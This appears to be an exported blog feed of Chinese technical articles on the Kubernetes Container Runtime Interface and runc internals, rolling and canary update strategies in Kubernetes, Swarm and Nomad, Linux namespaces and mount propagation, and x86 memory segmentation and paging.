    <content type="text"><![CDATA[kubernetes CRI kubernetes是一个容器编排系统，可以便捷的部署容器，它同时支持Docker和Rocket两种容器类型。然而不管是Docker还是Rocket都需要通过内部、不太稳定的接口直接集成到kubelet的源码中，这样的集成过程需要开发者十分熟悉kubelet内部原理，同时维护起来也非常麻烦。在kubernetes1.5版本中，提供了一个清晰定义的抽象层消除了这些障碍，开发者可以专注于构建他们的容器运行时，这个抽象层称作Container Runtime Interface(CRI)接口，下面介绍一下CRI这个概念。 CRI CRI是一个插件接口，这个接口的引入使得kubelet不用重新编译的情况下管理多种容器类型。CRI主要由gRPC API和protocol buffers组成，它的架构图如下所示： kubelet与容器运行时(或者是CRI shim)之间的通信是借助gRPC框架通过unix套接字完成的，kubelet作为client，CRI shim作为server来实现。对于docker容器而言，dockershim是kubelet的CRI shim，它负责与kubelet的gRPC客户端进行通信。 CRI shim的gRPC API主要包括Image Service和Runtime Service两部分，其中Image Service主要用来拉取、检查和删除镜像文件，而Runtime Service主要用来管理Pod和container的整个生命周期。 kubernetes拉起Docker的过程 在kubernetes中，是由kubelet组件来完成启动Docker容器的过程。在老版本(v1.5.6)的kubelet中，CRI作为一个可选项使用的，如果没有启用CRI功能，那么kubelet在执行容器时，需要经过如下调用： 1kubelet-&gt;docker-client(http api)-&gt;docker daemon-&gt;containerd-&gt;shim-&gt;runc 容器启动后的进程关系如下图所示： 1234dockerd -H fd:// |-containerd -l unix:///var/run/docker/libcontainerd/docker-containerd.sock --shim containerd-shim --metrics-interval=0 --start-timeout 2m --state-dir /var/run/docker/libcontainerd/containerd --runtime runc | |-containerd-shim 512353b8e356c26728f10350af91dc68704cb23264e02975d6a8e938bc8f3a12 /var/run/docker/libcontainerd/512353b8e356c26728f10350af91dc68704cb23264e02975d6a8e938bc8f3a12 runc | | |-app 如果启用了CRI功能，kubelet在执行容器时，则经过了下面的调用: 1kubelet-&gt;dockershim-&gt;docker-client(http api)-&gt;docker daemon-&gt;containerd-&gt;shim-&gt;runc 其中containerd的架构图如下所示: containerd与docker的关系如下图所示： contained向上为Docker Daemon提供了gRPC接口，使得Docker Daemon屏蔽下面的结构变化，确保原有接口向下兼容，向下通过containerd-shim结合runc，实际的创建容器、运行容器，这样使得引擎可以独立升级，避免之前Docker Daemon升级导致所有容器不可用的问题。 而dockershim是一个封装了docker-client的gRPC server，它和kubelet一起启动，kubelet将创建容器的请求以gPRC的方式发送给dockershim，然后dockershim调用docker-client将创建容器的请求发送给docker daemon。 容器间如何组成一个Pod Pod是kubernetes中的一个概念，它由一个或多个容器组成。在创建Pod的时候，过程主要如下： 创建一个Pod sandbox，也称为pod container，镜像是pause，它保持着net namespace打开，同一个Pod内的其他容器通过Docker的--net=container:&lt;id&gt;加入到这个net namespace中，同一个Pod中容器间也共享着IPC namespace，这意味着同一个Pod内的容器可以通过localhost互相访问，同时共享同一套IPC进程间通信，在新版本的kubernetes中也实现了 pid namespace的共享。 创建init container(可选) 创建正常的container，将新container加入到pod container的net、ipc、pid(当前版本1.7.3有)namespace中，同时从 pod container 中继承来了 cgroup parent、seccomp等。 在当前版本(v1.7.3)的kubelet中，CRI已成为了缺省选项。为了进一步的降低kubernetes对容器管理的复杂性，引入了CRI-O项目，下面简单的介绍一下CRI-O。 CRI-O kubernetes支持了Docker等多种容器类型，由于docker等容器项目变化太快，导致了kubernetes中对容器的管理部分经常修改，进而造成k8s整体的不稳定性。为了使得kubernetes从各种容器的管理工作中解脱出来，kubernetes孵化了CRI-O这个项目，CRI-O旨在不依赖传统容器引擎的前提下，使得Kubernetes调用框架可以管理和启动容器化的服务类型。 CRI-O是kubernetes CRI接口的一个实现，通过使用OCI标准来兼容各种容器类型，它是kubernetes使用docker运行环境的一个轻量级的替代方案，它允许kubernetes使用任何支持OCI标准的容器类型运行Pod。它的架构图如下： kubernetes通过kubelet来运行一个Pod(Pod是由一个或多个容器组成的容器集合，它们共享相同的IPC、NET、PID Namespace) kubelet创建Pod时，通过CRI接口将请求转发给CRI-O daemon CRI-O通过containers/image库从registry中拉取镜像 下载后的镜像解压成容器的root文件系统 然后CRI-O通过OCI生成工具生成一份OCI配置 CRI-O通过OCI运行工具拉起实际的container，默认的OCI运行工具是runc 每一个容器通过一个独立的conmon进程来监控，这个conmon进程拥有pty终端，且是容器PID 1的进程(init) 通过CNI接口设置Pod的网络模型，CRI-O中可以使用任何CNI插件 如果k8s使用的容器运行环境为CRI-O，那么在拉起docker类型的Pod时，不需要借助docker daemon了。 runc在整个容器的生命周期中占据了非常重要的部分，它是容器的执行引擎，下面介绍一下runc。 runc runc概括的来说是Docker容器的执行引擎，可以通过runc这个工具创建、启动和停止Docker容器，本文从runc的概念、用法、与kubernetes的关系以及运行原理四个方面对runc进行介绍。 runc的概念 runc是libcontainer的封装，而libcontainer是对操作系统关于容器方面的一些接口。runc运行容器需要两部分信息： 一个OCI配置(JSON) 一个rootfs文件系统 这两部分信息简称bundle，其中OCI(Open Container Initiative)是一个开放容器标准组织，旨在围绕容器格式和运行时制定一个开放的工业化标准OCF(Open Container Format)。runc是由Docker贡献出来的，按照OCF的标准制定的一种具体实现。下面接单的介绍一下runc的用法。 runc的使用 runc包括两部分，首先是一个OCI配置，可以通过 1runc spec 生成一份缺省的OCI配置，这里简单的浏览一下OCI中各个配置项。容器的创建除了OCI配置之外，还需要一个rootfs文件系统，这个文件系统可以通过docker export的方式获取到 1234docker pull busyboxdocker export $(docker create busybox) &gt; busybox.tarmkdir busyboxtar -C busybox -xf busybox.tar 有了这两部分东西之后，就可以实际的运行一个容器了，bundle包括一份OCI配置和一个rootfs，通过在bundle的目录下运行 1runc run busybox 可以运行一个busybox的容器。下面演示一下不同的配置对容器实际运行的影响，包括三个方面: capability中的CAP_SYS_ADMIN权限对hostname的影响 通过mounts中的一些选项为新容器挂载一些设备 通过指定namespaces中的path将容器放在一个已有的namespace中 代码和配置放在了Github runc-demo。 capability in docker 下面介绍一下docker中的capability，可以通过 1capsh --print 查看容器所拥有的capability，也可以通过 1docker inspect $container_id | grep Cap 查看容器Add和Drop的capability权限。其中缺省capability记录了容器在启动时有一些默认开启的capability，在Docker文档中描述了容器全部的capability。 同时在docker容器启动时可以通过--cap-add和--cap-drop来动态的增加和去掉capability，比如为busybox容器增加SYS_PTRACE权限，这样的话，容器内可以使用ptrace这个命令了。在Docker中有一种privileged容器，通过 1docker run --privileged 可以运行一个特权的容器，这个容器共享本机拥有的全部权限，这些权限定义在主机的appArmor和SELinux中。 runc run运行过程分析 通过容器标准包bundle来运行一个容器实例，容器bundle是一个文件目录，它包括容器配置的spec文件和一个rootfs文件系统，下面是运行容器时的简要流程图： 接下来简单的叙述一下容器运行的过程。 新建notifySocket 首先是新建一个通知套接字notifySocket，然后将notifySocket的信息写入到容器的OCI配置中，包括Mounts配置和进程的环境信息。 创建容器实例 createContainer：根据命令行参数和容器配置的spec文件初始化libcontainer config对象，根据命令行参数来初始化factory对象，然后factory依据libcontainer config来创建具体的容器实例。 设置notifySocket套接字 创建unixgram套接字，完成notifySocket的初始化过程 初始化runner对象，启动容器 通过传入文件描述符给容器的init进程来按需激活socket套接字，然后初始化runner对象，执行runner对象的run方法。 检查terminal 检查terminal(如果配置了detach或者action是Create，那么分配终端的时候必须设置console socket,相应的如果没有分配终端或者没有detach，则不能使用console socket) 初始化libcontainer process进程对象 newProcess：根据配置文件新建libcontainer的进程对象process，简称LP 初始化信号处理程序 初始化信号处理程序(处理SIGCHILD、SIGWINCH信号，并且转发所有的信号到这个LP进程，如果设置了notifySocket，那么可以通过它来读取容器里的systemd的通知，并且将通知转发给notifySocketHost) 设置IO，返回tty终端 1、如果配置文件需要创建终端的话，那么需要设置进程的0,1,2三个IO 2、不detach的时候，需要新建一个console套接字对(parent和child)，其中child分配给LP,用于本进程的tty对象和LP的tty通信 3、如果detach的话，consoleSocket会通过unix套接字的形式保持通信，runc的调用方会处理从console master收到的信息 4、如果detach的话，还需要继承本进程的标准IO 0，1，2 那么容器会继承runc的标准IO 5、设置LP进程的管道，这样可以不借助特定路径和设备的情况下，便捷的快照和恢复进程的IO。 启动容器实例 1、首先判断当前容器的状态，如果状态是STOPPED(需要初始化)，那么还需要创建一个Fifo，并将属主改成容器进程的uid和gid账户 2、开始启动容器实例 (1) 新建一个parent process [initProcess(STOPPED) 或者 setnsProcess(!STOPPED)] 创建一个init的套接字对，用于父子进程通信，并将childPipe分配给LP 然后初始化执行LP进程的命令cmd，这个会调用runc init，会勾起nsenter这个cgo程序 如果状态不是STOPPPED，那么不需要初始化，返回一个setnsProcess进程 如果我们不执行runc exec才可以设置fifoFd，历史原因是通过传入一个目录的dirfd来允许容器的rootfs逃逸， 对于runc exec不需要做这些，然后返回一个initProcess进程 (2) 执行parent进程(用Golang的cmd执行进程) 启动LP进程，将进程的Pid写入到cgroup中，如果配置了intelRdtManager，将Pid也写进Rdt中 将bootstrap的数据 [namespace path，clone flags，uid mapping…] 传入到管道中，让nsenter进程可以接收到 执行execSetns()函数，主要等待执行LP的进程结束，并收割它的子进程，通过管道接收子进程的pid 创建网络接口 将LP的配置发送给容器的初始进程 与容器的init进程通信，如果程序已经procReady了，那么需要设置rlimits， 如果配置Mount Namespace的情况下，需要配置cgroup和intelRdt，然后运行启动前的钩子函数 如果管道传来的类型是procHooks，需要配置cgroup和intelRdt，然后运行钩子函数。 最后关闭父子进程的管道描述符 (3) 收割parent进程 (4) 如果是初始化init进程的话，需要更新状态，并执行启动后的钩子函数 (5) 如果不是初始化的话，直接将容器的状态改为Running 3、等待Console的控制 4、关掉Console，并执行一些钩子函数 5、进行信号处理，分别处理SIGWINCH和SIGCHLD两种信号 6、最后将runner销毁 runc中对Namespace的应用 这里介绍一下runc中对Namespace的应用 Mount Namespace 1、容器配置中需要创建一个Mount Namespce，需要为新容器准备一个rootfs。首先是根路径’/‘的挂载，配置文件中如果配置了根路径’/'的传播属性，那么将 / 根目录以此传播属性挂载，否则以MS_SLAVE和MS_REC方式挂载。 2、将本进程也就是容器的父进程(parent)的挂载点设置成私有挂载属性，也就是将挂载属性为:shared的’/'根路径重新挂载成MS_PRIVATE, 以此来确保接下来的绑定挂载不会传播到其他Namespace中，这也可以帮助内核调用pivot_root的检查通过。 3、将rootfs绑定挂载起来，挂载属性为MS_BIND和MS_REC。 注意MS_REC含义是: 通常和MS_BIND结合使用，用来创建一个递归的绑定挂载，同时也可以和传播类型进行结合，可以递归的将挂载事件递归的传播到所有的挂载树上。 然后执行配置中的一些Mount操作，主要包括以下操作： 包括挂载前的操作命令 pre-mount-cmd 将配置文件中的一些挂载点挂载到rootfs上，比如proc、mqueue、tmpfs等 挂载后的操作命令 post-mount-cmd 不需要启动dev文件的条件：/dev设备是bind类型，如果需要启动设备文件的时： 1、如果container运行在一个User Namespace那么不允许使用mknod来创建一个设备，因此只需要通过bind来进行绑定挂载操作，否则需要通过mknod在容器里面创建设备，并进行bind操作。 2、设置ptmx和/dev符号链接。 通过管道给父进程发送JSON playload，这可以使得父进程执行一些前置的钩子。在切换到新的root时，对于任何挂载操作，老的root的钩子仍然是可以用的。 然后将文件目录切换到rootfs目录下面： 如果配置中没有pivotRoot操作，那么将/解挂载，通过chroot来设置新的root目录 如果配置中有pivotRoot操作，那么通过pivotRoot操作来切换root目录视图。 如果需要设置dev文件的话，在切换完root目录之后，再次打开/dev/null。 User Namespace 在创建容器的时候需要初始化安全计算模型，简称seccomp，seccomp控制着容器所拥有的细粒度的操作系统权限。在完成最终的初始化seccomp之前，还需要设置容器的用户和用户组。 容器默认的执行用户情况是: 1&#123;uid: 0, gid: 0, Home: &quot;/&quot;&#125; 然后根据配置文件中配置的uid和gid信息，更新容器的uid和gid信息，这里要/etc/passwd和/etc/group中的信息来判断用户设置的uid和gid的合法性。 当设置完用户和用户组id之后，在真正执行容器命令前，根据配置文件生效一下容器的Cap。 Network Namespace 根据配置文件创建网卡、配置路由。 1、主要创建两种网卡设备：loopback和veth，为容器创建网卡设备，配置网关。 2、从配置文件中读取路由策略，然后构成路由规则写入到系统中。 UTS Namespace 设置配置文件中的主机名]]></content>
      <tags>
        <tag>docker</tag>
        <tag>kubernetes</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[容器编排服务变更策略调研]]></title>
    <url>%2F2017%2F10%2F27%2F%E5%AE%B9%E5%99%A8%E7%BC%96%E6%8E%92%E6%9C%8D%E5%8A%A1%E5%8F%98%E6%9B%B4%E7%AD%96%E7%95%A5%E8%B0%83%E7%A0%94%2F</url>
    <content type="text"><![CDATA[容器编排服务变更策略调研 本文调研目前流行的三款容器编排平台的服务变更策略，包括kubernetes、swarm、nomad。 其中它们的版本信息如下: 平台|版本 kubernetes|v1.8 swarm|v1.2.8 nomad|v0.6.3 下面分别介绍一下这些平台的服务变更策略。 kubernetes 在Kubernetes中，是由deployment控制器来控制服务变更的过程，它目前提供了两种服务变更策略，分别是： Recreate RollingUpdate 下面分别介绍一下这两种服务变更策略。 Recreate Recreate这种服务变更策略非常简单粗暴，要把deployment关联的现存Pod全部杀掉之后，才能进行升级。 RollingUpdate RollingUpdate是滚动更新的意思，可以通过这种策略来精确的控制服务变更的过程。在deployment中有两个字段是与服务变更的过程有关，分别是Max Unavailable和Max Surge，下面分别介绍一下这两个字段的含义。 Max Unavailable .spec.strategy.rollingUpdate.maxUnavailable是一个可选的字段，用来表明在升级过程中Pod的最大不可用数目，如果超过这个数目的话，deployment便不会销毁旧的实例，停止更新的过程。 这个值可以是一个绝对数值，也可以是一个百分比，默认值是25%。有一点需要注意的是，当.spec.strategy.rollingUpdate.maxSurge为0时，.spec.strategy.rollingUpdate.maxUnavailable不能为0。 举个例子当该值设置成30%时，deployment会立马将旧的ReplicaSet缩减为原来的70%，然后新建新的ReplicaSet，当新的ReplicaSet已经ready之后才能继续完成升级操作。 Max Surge .spec.strategy.rollingUpdate.maxSurge是一个可选字段，它表明了可以创建超过期望Pod个数的最大数目，它可以是一个绝对值，也可以是一个百分比形式。它的值和.spec.strategy.rollingUpdate.maxUnavailable不能同时为0。 举个例子，当这个值设置成30%时，当滚动更新开始时，新的ReplicaSet可以立马开始扩容，但是要保证新的ReplicaSet和旧的ReplicaSet的Pod数目不能超过Pod期望数目的130%。 小结 比如deployment的定义如下: .spec.replicas: 10 .spec.strategy.rollingUpdate.maxSurge: 30% .spec.strategy.rollingUpdate.maxUnavailable: 30% 那么在更新过程中，旧的ReplicaSet会缩容到70%，也就是7个Pod，新的ReplicaSet会扩容到6个Pod，要同时保证不可用的数目在30%以下，总的Pod数目在130%以下，当新的ReplicaSet有Pod启动好了，那么会继续缩容旧的ReplicaSet。 kubernetes Deployment swarm swarm是docker官方推出的一款容器编排管理工具，它通过docker service的形式来管理容器实例的变更过程。在创建docker service前，必须先初始化swarm集群，比如创建一个http服务： 1# docker swarm init &amp;&amp; docker service create --name http --replicas 2 -p 80:80 katacoda/docker-http-server:v1 可以通过docker service的方式来滚动更新和弹性扩展服务。涉及到服务的更新过程是通过docker service update来实现的，它有以下字段控制着实例的变更过程。 --update-parallelism: 确保实例更新的并发度 --update-delay: 设置每次更新的时间间隔 --update-max-failure-ratio: 更新时允许失败的容器数目比 --update-failure-action: 更新失败时的动作 [pause,continue,rollback] --update-monitor: 监控容器更新失败的时间 --rollback: 回滚前一个版本 --rollback-delay: 每次回滚操作之间的时间间隔 --rollback-failure-action: 当回滚失败时的动作 [pause,continue] --rollback-max-failure-ratio: 回滚失败允许失败的容器数目比 --rollback-parallelism: 回滚的并发度 Docker Service Nomad Nomad是Hashicorp设计的一款容器编排系统，它拥有服务变更策略多种多样，包括了： Rolling Upgrades: 滚动升级 Blue/Green &amp; Canary Deployments: 蓝/绿 &amp; Cannary 部署 Handling Signals: 信号处理方式 下面分别简单的介绍一下这几种服务变更策略。 RollingUpdate RollingUpdate是滚动变更的意思，它是nomad第一个支持的服务变更策略，为了在job和task中使用这种服务变更策略，需要在更新策略中使用update这个配置，也叫update stanza类似如下： 12345678910111213job "geo-api-server" &#123; ... group "api-server" &#123; ... # Add an update stanza to enable rolling updates of the service update &#123; max_parallel = 2 min_healthy_time = "30s" healthy_deadline = "10m" &#125; ... &#125;&#125; 在这个例子中通过增加update stanza为api-server这个任务组增加了服务变更策略，当api-server这个任务组需要更新时，会首先创建2个新版本的实例，并且要求新版本的实例要保持Health状态30秒，才可以继续进行服务变更。 也就是说nomad的RollingUpdate的服务更新策略与update stanza息息相关，下面简单的介绍一下update stanza。 update Stanza update Stanza指明了任务组的更新策略，如果不指定的话那么服务变更时将不会出发滚动升级和Cannary，主要一下更新参数： max_parallel: 指明任务组同时可以更新的数目 health_check: 指明健康检查的机制，主要有checks(所有的实例处于运行状态，并且关联的checks状态正常时，才处于健康状态)、task_states(仅仅检查所有task是否处于运行状态，如果是运行状态那么处于health，否则是不健康状态)、manual(指明Nomand不能自动的检查健康，而是由操作人员通过HTTP API的方式判断健康状态) `` min_healthy_time: 指明每个实例必须处于健康状态的最短持续时间。 healthy_deadline: 指明每个实例必须被标记为health状态的时间，如果还没有变成health状态，那么自动转换成不健康状态。 auto_revert: 指明当一个任务更新失败时，是否回滚到最近的一个稳定版本。 canary: 在进行job升级时，会创建指定数目的canary实例，只有这些canary实例是health状态，才可以开始进行服务变更过程，这个过程是通过max_parallel来触发的。 stagger: 指明实例在node间故障迁移的时间间隔。 Blue/Green &amp; Canary Deployments 有时候rolling upgrades在生产环境中没有提供足够的灵活性，很多企业在生产环境更新时，会通过部署一个canary，技术上叫做蓝绿部署，这种方式来确保服务能够稳定的变更，以减少不可用的时间。 这个是通过update stanza中的canary配置来实现的，假如配置如下： 123456789101112131415job "docs" &#123; ... group "api" &#123; count = 5 update &#123; max_parallel = 1 canary = 5 min_healthy_time = "30s" healthy_deadline = "10m" auto_revert = true &#125; ... &#125;&#125; 在升级时，会创建5个新版本的实例(canary部分)，通过查看部署信息： 1234Latest DeploymentID = 32a080c1Status = runningDescription = Deployment is running but requires promotion 如果本次的升级没有异常时，可以进行主体服务的升级，将旧版本的服务下掉 12# 将旧版本的5个实例下掉nomad deployment promote 32a080c1 如果升级出现异常，可以回滚上个版本 1nomad deployment fail 32a080c1 这样新版本的5个实例会被下掉，本次上线服务主体不受影响。 Handling Signals 现代操作系统支持信号机制，nomad在杀掉一个应用之前，会给这个应用发送一个信号，这个信号是可以配置的，这种方式允许一些应用当被nomad杀掉的时候，有机会进行优雅的退出、销毁资源操作等等。同时nomad允许指定一个时间，在杀死该应用时，等待用户程序的退出。 在nomad终结一个进程时，会给该进程发送SIGINT信号，在nomad下的进程应该响应这个信号，以优雅的退出，如果超过配置的时间内还没有处理该信号，那么这个进程会被强制杀掉。]]></content>
      <tags>
        <tag>调研</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux Namespae介绍]]></title>
    <url>%2F2017%2F09%2F26%2FLinux-Namespace%E7%AE%80%E4%BB%8B%2F</url>
    <content type="text"><![CDATA[Linux Namespace简介 Linux Namespace提供了一种内核级别隔离系统资源的方法，通过将系统的全局资源放在不同的Namespace中，来实现资源隔离的目的。不同Namespace的程序，可以享有一份独立的系统资源。目前Linux中提供了六类系统资源的隔离机制，分别是： Mount: 隔离文件系统挂载点 UTS: 隔离主机名和域名信息 IPC: 隔离进程间通信 PID: 隔离进程的ID Network: 隔离网络资源 User: 隔离用户和用户组的ID 下面简单的介绍一下这些Namespace的使用和功能。 Namespace的使用 涉及到Namespace的操作接口包括clone()、setns()、unshare()以及还有/proc下的部分文件。为了使用特定的Namespace，在使用这些接口的时候需要指定以下一个或多个参数： CLONE_NEWNS: 用于指定Mount Namespace CLONE_NEWUTS: 用于指定UTS Namespace CLONE_NEWIPC: 用于指定IPC Namespace CLONE_NEWPID: 用于指定PID Namespace CLONE_NEWNET: 用于指定Network Namespace CLONE_NEWUSER: 用于指定User Namespace 下面简单概述一下这几个接口的用法。 clone系统调用 可以通过clone系统调用来创建一个独立Namespace的进程，它的函数描述如下： 1int clone(int (*child_func)(void *), void *child_stack, int flags, void *arg); 它通过flags参数来控制创建进程时的特性，比如新创建的进程是否与父进程共享虚拟内存等。比如可以传入CLONE_NEWNS标志使得新创建的进程拥有独立的Mount Namespace，也可以传入多个flags使得新创建的进程拥有多种特性，比如： 1flags = CLONE_NEWNS | CLONE_NEWUTS | CLONE_NEWIPC; 传入这个flags那么新创建的进程将同时拥有独立的Mount Namespace、UTS Namespace和IPC Namespace。 通过/proc文件查看Namespace的存在 在3.8内核开始，用户可以在/proc/$pid/ns文件下看到本进程所属的Namespace的文件信息。例如PID为2704进程的情况如下图所示： 其中4026531839表明是Namespace的ID，如果两个进程的Namespace ID相同表明两个进程同处于一个命名空间中。 这里需要注意的是：只/proc/$pid/ns/对应的Namespace文件被打开，并且该文件描述符存在，即使该PID所属的进程被销毁，这个Namespace会依然存在。可以通过挂载的方式打开文件描述符： 12touch ~/mntmount --bind /proc/2704/mnt ~/mnt 这样就可以保留住PID为2704的进程的Mount Namespace了，即使2704进程被销毁或者退出，ID为4026531840的Mount Namespace依然会存在。 setns用来加入已存在的Namepspace setns()函数可以把进程加入到指定的Namespace中，它的函数描述如下： 1int setns(int fd, int nstype); 它的参数描述如下： fd参数：表示文件描述符，前面提到可以通过打开/proc/$pid/ns/的方式将指定的Namespace保留下来，也就是说可以通过文件描述符的方式来索引到某个Namespace。 nstype参数：用来检查fd关联Namespace是否与nstype表明的Namespace一致，如果填0的话表示不进行该项检查。 通过在程序中调用setns来将进程加入到指定的Namespace中。 unshare创建新的Namespace unshare()系统调用用于将当前进程和所在的Namespace分离，并加入到一个新的Namespace中，相对于setns()系统调用来说，unshare()不用关联之前存在的Namespace，只需要指定需要分离的Namespace就行，该调用会自动创建一个新的Namespace。 unshare()的函数描述如下： 1int unshare(int flags); 其中flags用于指明要分离的资源类别，它支持的flags与clone系统调用支持的flags类似，这里简要的叙述一下几种标志： CLONE_FILES: 子进程一般会共享父进程的文件描述符，如果子进程不想共享父进程的文件描述符了，可以通过这个flag来取消共享。 CLONE_FS: 使当前进程不再与其他进程共享文件系统信息。 CLONE_SYSVSEM: 取消与其他进程共享SYS V信号量。 CLONE_NEWIPC: 创建新的IPC Namespace，并将该进程加入进来。 注意事项 这里需要注意的是：unshare()和setns()系统调用对PID Namespace的处理不太相同，当unshare PID namespace时，调用进程会为它的子进程分配一个新的PID Namespace，但是调用进程本身不会被移到新的Namespace中。而且调用进程第一个创建的子进程在新Namespace中的PID为1，并成为新Namespace中的init进程。 setns()系统调用也是类似的，调用者进程并不会进入新的PID Namespace，而是随后创建的子进程会进入。 为什么创建其他的Namespace时unshare()和setns()会直接进入新的Namespace，而唯独PID Namespace不是如此呢？因为调用getpid()函数得到的PID是根据调用者所在的PID Namespace而决定返回哪个PID，进入新的PID namespace会导致PID产生变化。而对用户态的程序和库函数来说，他们都认为进程的PID是一个常量，PID的变化会引起这些进程奔溃。换句话说，一旦程序进程创建以后，那么它的PID namespace的关系就确定下来了，进程不会变更他们对应的PID namespace。 小结 通过上面简单的概述，对于Namespace的操作有以下方式： 1、可以在进程刚创建的时候通过clone系统调用为新进程分配一个或多个新的Namespace。 2、通过setns()将进程加入到已有的Namespace中。 3、通过unshare()为已存在的进程创建一个或多个新的Namespace。 接下来详细的介绍一下各个Namespace的功能和特性。 Mount Namespace Mount Namespace用来隔离文件系统的挂载点，不同Mount Namespace的进程拥有不同的挂载点，同时也拥有了不同的文件系统视图。Mount Namespace是历史上第一个支持的Namespace，它通过CLONE_NEWNS来标识的。 挂载的概念 挂载的过程是通过mount系统调用完成的，它有两个参数：一个是已存在的普通文件名，一个是可以直接访问的特殊文件，一个是特殊文件的名字。这个特殊文件一般用来关联一些存储卷，这个存储卷可以包含自己的目录层级和文件系统结构。mount所达到的效果是：像访问一个普通的文件一样访问位于其他设备上文件系统的根目录，也就是将该设备上目录的根节点挂到了另外一个文件系统的页节点上，达到了给这个文件系统扩充容量的目的。 可以通过/proc文件系统查看一个进程的挂载信息，具体做法如下： 1cat /proc/$pid/mountinfo 其输出结果如下： 其中输出的格式如下： 36 | 35 | 98:0 | /mnt1 | /mnt2 | rw,noatime | master:1 | - | ext3 | /dev/root | rw,errors=continue (1)| (2) | (3) | (4) | (5) | (6) | (7) | (8) | (9) | (10) | (11) 各个选项的含义如下： (1) mount ID: 对于mount操作一个唯一的ID (2) parent ID: 父挂载的mount ID或者本身的mount ID(本身是挂载树的顶点) (3) major:minor: 文件系统所关联的设备的主次设备号 (4) root: 文件系统的路径名，这个路径名是挂载点的根 (5) mount point: 挂载点的文件路径名(相对于这个进程的根目录) (6) mount options: 挂载选项 (7) optional fields: 可选项，格式 tag:value (8) separator: 分隔符，可选字段由这个单个字符标示结束的 (9) filesystem type: 文件系统类型 type[.subtype] (10) mount source: 文件系统相关的信息，或者none (11) super options: 一些高级选项（文件系统超级块的选项） 挂载传播 进程在创建Mount Namespace时，会把当前的文件结构复制给新的Namespace，新的Namespace中的所有mount操作仅影响自身的文件系统。但随着引入挂载传播的特性，Mount Namespace变得并不是完全意义上的资源隔离，这种传播特性使得多Mount Namespace之间的挂载事件可以相互影响。 挂载传播定义了挂载对象之间的关系，系统利用这些关系来决定挂载对象中的挂载事件对其他挂载对象的影响。其中挂载对象之间的关系描述如下： 共享关系(MS_SHARED)：一个挂载对象的挂载事件会跨Namespace共享到其他挂载对象。 从属关系(MS_SLAVE): 传播的方向是单向的，即只能从Master传播到Slave方向。 私有关系(MS_PRIVATE): 不同Namespace的挂载事件是互不影响的(默认选项)。 不可绑定关系(MS_UNBINDABLE): 一个不可绑定的私有挂载，与私有挂载类似，但是不能执行挂载操作。 其中给挂载点设置挂载关系的例子如下： 1234mount --make-shared /mntS # 将挂载点设置为共享关系属性mount --make-private /mntP # 将挂载点设置为私有关系属性mount --make-slave /mntY # 将挂载点设置为从属关系属性mount --make-unbindable /mntU # 将挂载点设置为不可绑定属性 注意在设置私有关系属性时，在本命名空间下的这个挂载点是Slave，而父命名空间下这个挂载点是Master，挂载传播的方向只能由Master传给Slave。 绑定挂载 绑定挂载的引入使得mount的其中一个参数不一定要是一个特殊文件，也可以是该文件系统上的一个普通文件目录。Linux中绑定挂载的用法如下： 12mount --bind /home/work /home/qiniumount -o bind /home/work /home/qiniu 其中/home/work是磁盘上的存在的一个目录，而不是一个文件设备(比如磁盘分区)。如果需要将Linux中两个文件目录链接起来，可以通过绑定挂载的方式，挂载后的效果类似于在两个文件目录上建立了硬链接。 在绑定挂载中同时会涉及到挂载的传播特性，挂载传播的特性参考：Linux绑定挂载]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[内存寻址之段页存储机制分析]]></title>
    <url>%2F2017%2F05%2F05%2F%E5%86%85%E5%AD%98%E5%AF%BB%E5%9D%80%E4%B9%8B%E6%AE%B5%E9%A1%B5%E5%AD%98%E5%82%A8%E6%9C%BA%E5%88%B6%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[背景 学习操作系统这门课的时候，曾不止一次的接触到操作系统的段页式管理机制，但当是都是浅尝辄止，不知道操作系统为啥要有这个机制。如今时间过去很久，关于这个机制的背后的原理和实现机制，早已忘记很久了。。最近在看操作系统方面的知识，借此把自己的理解记录一下。 要理解段页式管理机制的发展历程，还得从早期的处理器的寻址方式说起。 内存寻址方式的发展历程 首先简单的介绍下内存寻址的概念，现代计算机是基于冯.诺依曼的体系结构，这个体系结构是以存储为中心的，也就是说所有的运算的前提都是先从内存中取得数据，所以内存寻址技术从某种程度上代表了计算机技术。 直接寻址 在处理器发展的早期阶段，Intel 公司推出了第一款8位的处理器–8080，它的内存寻址的方式简单粗暴，程序都是通过硬编码的形式绝对定位到内存地址。这种情况下的程序都有明显的缺点：可控性弱、难以重定位、难以维护等。 分段 很快在 Intel 推出的另一款处理器 8086 中，它可以寻址空间达到 1M，即地址线扩展到了 20 位，由于当时制造20位的寄存器比较困难，为了能在 16 位的寄存器的基础上寻址 20 位的地址空间，引入了一个重要的概念——段，段的地址存放在寄存器中，换句话说把 1M 的空间分成数个 64K（16位寄存器可寻址）的段来管理。所以8086中的分段机制的内存寻址为： 1段基址左移4位 + 偏移 = 物理地址 为了很好的支持分段机制，8086 处理器为程序使用的代码段、数据段、堆栈段分别提供了专门的 16 位寄存器用于保存这些段的段基址。引入了分段机制后，程序的地址不再需要硬编码了，调试错误也更加容易定位，同时更加重要的是支持了更大的内存地址空间。 分页与虚拟内存 分页机制第一次出现在 80386 的处理器中，这是内存寻址方式的一个重大突破，对后来的计算机系统产生了很大影响。80386处理器寻址空间达到 32 位，是为了配合虚拟内存技术而引入了分页机制，接下来简单的说下虚拟内存技术。 简单的来说，虚拟内存技术允许程序使用的内存大于计算机的实际内存。举个简单例子来说，运行一个大型游戏的时候，它需要 5G 内存，但是 32 位的笔记本最大支持 4G 内存，而冯.诺依曼体系告诉我们，程序运行的时候，需要将程序装载到内存中才可以运行，那么难道这个游戏就玩不了了么？不是的，借助虚拟内存技术就可以运行这个程序了，只不过可能会卡点。 虚拟内存技术本质上将部分硬盘空间映射到内存中的一种技术，这样使得程序可以使用的内存空间变大了。简单的做法是如果程序访问的地址不在内存中时（放在外部磁盘空间中），就需要将访问地址所对应磁盘空间的程序内容加载到内存中，在加载的过程中可能面临着旧程序内容的置换。如何方便的管理这些置换或者加载的内容呢？操作系统引入了页的概念，页是一个存储单位，一般为4K 大小。 话说回来能通过段机制管理这些被置换和加载的内容么？因为段的大小不定，因此不方便把整段大小的虚拟空间在内存和磁盘之间调来调去，需要一个更小更灵活的存储单位——页，管理换进换出的机制称为页机制。 